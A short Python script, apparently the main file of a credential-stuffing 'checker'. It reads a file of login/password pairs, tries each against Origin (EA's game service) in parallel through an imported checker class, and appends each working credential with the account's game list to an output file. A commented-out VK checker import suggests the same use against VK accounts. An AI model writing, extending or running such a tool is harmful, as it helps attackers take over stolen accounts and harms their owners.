from Parser import Parser
# from VkCheck import VK_Checker
from OriginChecker import Origin_Checker
from VkCheck import debug_print
from multiprocessing import Pool

logins = []
base = Parser()
file_path = "test.base.txt"
base.pars(file_path)
for login in base.login_password:
    logins.append(login)
a = [1, 2]
b = [4, 5]


def th(i):
    global logins, base
    debug_print(str(i), "cyan")
    login = logins[i]
    debug_print(login, "cyan")
    password = base.login_password.get(login)
    debug_print(login + ' ' + password, "cyan")
    c = Origin_Checker(login, password)
    code = c.auth_origin()
    if (code == 0):
        c.get_games()
        f = open("base_check.txt", "a")
        f.write(login + " " + password + " " + c.game_list + '\n')
        f.close()


if __name__ == "__main__":
    with Pool() as pool:
        th1 = pool.map(th, a)
        th2 = pool.map(th, b)
        pool.close()
        pool.join()